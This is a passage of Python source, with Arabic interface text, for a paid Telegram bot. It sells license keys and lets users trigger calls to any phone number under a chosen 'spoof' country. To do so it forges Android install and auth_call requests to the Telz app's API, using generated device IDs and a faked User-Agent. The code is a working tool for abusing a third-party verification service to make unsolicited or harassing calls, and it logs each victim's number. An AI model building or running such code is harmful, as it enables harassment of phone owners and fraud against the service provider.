        c.execute("SELECT calls FROM usage WHERE user_id = ? AND date = ?", (user_id, today))
        calls_today = c.fetchone()
        calls_today = calls_today[0] if calls_today else 0
        text = f"""👤 **حسابك**

• المدة: {license_data[2]} يوم
• الحد اليومي: {license_data[3]} مكالمة
• المكالمات اليوم: {calls_today}/{license_data[3]}
• المتبقي اليوم: {license_data[3] - calls_today}
• ينتهي في: {license_data[5]}"""
        bot.send_message(call.message.chat.id, text, parse_mode='HTML')

    elif data == "show_history":
        c.execute("SELECT spoof_name, full_phone, success, time FROM call_history WHERE user_id = ? ORDER BY id DESC LIMIT 15", (user_id,))
        rows = c.fetchall()
        text = "📜 **سجل الاتصالات**\n\n" if rows else "📭 لا يوجد سجل بعد"
        for row in rows:
            status = "✅ نجح" if row[2] else "❌ فشل"
            text += f"{status} | {row[3]} | {row[0]} → <code>{row[1]}</code>\n\n"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⬅️ رجوع", callback_data="main_menu"))
        bot.send_message(call.message.chat.id, text, parse_mode='HTML', reply_markup=markup)

    elif data == "request_call":
        can_use, msg_text = check_daily_limit(user_id)
        if not can_use:
            bot.answer_callback_query(call.id, msg_text, show_alert=True)
            return
        markup = types.InlineKeyboardMarkup(row_width=2)
        for name, prefix in SPOOF_COUNTRIES.items():
            markup.add(types.InlineKeyboardButton(name, callback_data=f"spoof_{prefix}"))
        markup.row(types.InlineKeyboardButton("🎲 دولة عشوائية", callback_data="random_spoof"))
        markup.row(types.InlineKeyboardButton("🔢 كود مخصص", callback_data="custom_spoof"))
        markup.row(types.InlineKeyboardButton("⬅️ رجوع", callback_data="main_menu"))
        bot.edit_message_text("🌍 اختر الدولة:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

    elif data.startswith("spoof_"):
        prefix = data.split("_")[1]
        spoof_name = next((name for name, p in SPOOF_COUNTRIES.items() if p == prefix), prefix)
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, f"🌍 الدولة: **{spoof_name}**\n\nأدخل الرقم:", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_phone_number, spoof_prefix=prefix, spoof_name=spoof_name)

    elif data == "random_spoof":
        spoof_name, prefix = random.choice(list(SPOOF_COUNTRIES.items()))
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, f"🎲 تم اختيار **{spoof_name}**\n\nأدخل الرقم:", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_phone_number, spoof_prefix=prefix, spoof_name=spoof_name)

    elif data == "custom_spoof":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "🔢 أدخل كود الدولة:")
        bot.register_next_step_handler(msg, process_custom_spoof)

    elif data in ["pricing", "help", "support", "main_menu"]:
        bot.answer_callback_query(call.id)
        if data == "pricing":
            bot.send_message(call.message.chat.id, "🎁 تواصل مع الدعم لمعرفة الباقات والأسعار.")
        elif data == "help":
            bot.send_message(call.message.chat.id, "❓ 1. اشترِ مفتاح\n2. فعّله\n3. اطلب مكالمة")
        elif data == "support":
            bot.send_message(call.message.chat.id, "📞 تواصل مع الأدمن للدعم.")
        elif data == "main_menu":
            show_main_menu(call.message.chat.id)

    # أزرار الأدمن
    elif data == "admin_create_key" and user_id == ADMIN_ID:
        msg = bot.send_message(call.message.chat.id, "أدخل مدة المفتاح بالأيام:")
        bot.register_next_step_handler(msg, process_duration)
    elif data == "admin_stats" and user_id == ADMIN_ID:
        c.execute("SELECT COUNT(DISTINCT user_id) FROM licenses WHERE user_id IS NOT NULL")
        users = c.fetchone()[0] or 0
        c.execute("SELECT COUNT(*) FROM call_history")
        calls = c.fetchone()[0] or 0
        bot.send_message(call.message.chat.id, f"📊 المستخدمين: {users}\nإجمالي المكالمات: {calls}")
    elif data == "admin_broadcast" and user_id == ADMIN_ID:
        msg = bot.send_message(call.message.chat.id, "أرسل الرسالة للبث:")
        bot.register_next_step_handler(msg, process_broadcast)

# ====================== معالجة تفعيل المفتاح ======================
def process_activate_key(message):
    result = activate_license(message.from_user.id, message.text)
    
    if result[0] == "choice":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("➕ أضف المدة والمكالمات", callback_data="add_to_license"))
        markup.add(types.InlineKeyboardButton("⏳ انتظر انتهاء المفتاح الحالي", callback_data="cancel_add"))
        bot.send_message(message.chat.id, result[1], reply_markup=markup, parse_mode='HTML')
        temp_keys[message.from_user.id] = message.text.strip().upper()
    
    elif result[0] is True:
        bot.reply_to(message, result[1], parse_mode='HTML')
        show_main_menu(message.chat.id)
    else:
        bot.reply_to(message, result[1])

# ====================== معالجات أخرى ======================
def process_duration(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        days = int(message.text.strip())
        msg = bot.reply_to(message, "الآن أدخل الحد اليومي للمكالمات:")
        bot.register_next_step_handler(msg, process_daily_limit, days)
    except:
        bot.reply_to(message, "❌ يرجى إدخال رقم صحيح")

def process_daily_limit(message, days):
    if message.from_user.id != ADMIN_ID: return
    try:
        limit = int(message.text.strip())
        key, expires = generate_license_key(days, limit)
        bot.send_message(message.chat.id, f"""✅ **تم إنشاء مفتاح جديد**

المفتاح: <code>{key}</code>
المدة: {days} يوم
الحد اليومي: {limit} مكالمة
ينتهي في: {expires}""", parse_mode='HTML')
    except:
        bot.reply_to(message, "❌ يرجى إدخال رقم صحيح")

def process_broadcast(message):
    if message.from_user.id != ADMIN_ID: return
    bot.send_message(message.chat.id, "✅ تم تسجيل الرسالة.")

def process_custom_spoof(message):
    prefix = message.text.strip().upper()
    msg = bot.reply_to(message, f"✅ تم حفظ الكود: **{prefix}**\n\nأدخل الرقم:")
    bot.register_next_step_handler(msg, process_phone_number, spoof_prefix=prefix, spoof_name=f"مخصص ({prefix})")

# ====================== إرسال المكالمة ======================
def process_phone_number(message, spoof_prefix, spoof_name):
    user_id = message.from_user.id
    can_call, _ = check_daily_limit(user_id)
    if not can_call:
        bot.reply_to(message, "❌ لا يمكن إرسال المكالمة حالياً")
        show_main_menu(message.chat.id)
        return

    number = message.text.strip()
    full_phone = "+963" + number if number.isdigit() and len(number) == 9 else (number if number.startswith("+") else "+" + number)

    bot.reply_to(message, f"🔄 جاري إرسال المكالمة من **{spoof_name}**...")

    ts, android_id, uid = generate_unique_ids()
    headers = {'User-Agent': f"Telz-Android/17.5.17 ({spoof_prefix}-{random.randint(1000,9999)})", 'Content-Type': "application/json"}

    success = False
    if send_request(install_url, headers, json.dumps({
        "android_id": android_id, "app_version": "17.5.17", "event": "install",
        "google_exists": "yes", "os": "android", "os_version": "9", "play_market": True, "ts": ts, "uuid": str(uid)
    })):
        if send_request(auth_call_url, headers, json.dumps({
            "android_id": android_id, "app_version": "17.5.17", "attempt": "0",
            "event": "auth_call", "lang": "en", "os": "android", "os_version": "9",
            "phone": full_phone, "ts": ts, "uuid": str(uid)
        })):
            success = True
            bot.reply_to(message, f"✅ تم إرسال المكالمة بنجاح!\nمن: **{spoof_name}**\nإلى: <code>{full_phone}</code>", parse_mode='HTML')
            send_to_telegram(f"<b>✅ مكالمة جديدة</b>\nمن: {spoof_name}\nإلى: {full_phone}")

    add_to_history(user_id, spoof_name, full_phone, success)
    show_main_menu(message.chat.id)

# ====================== تشغيل البوت ======================
if __name__ == '__main__':
    print("🚀 البوت شغال الآن - الزرين (إضافة + انتظار) مصلحين")
    bot.infinity_polling()
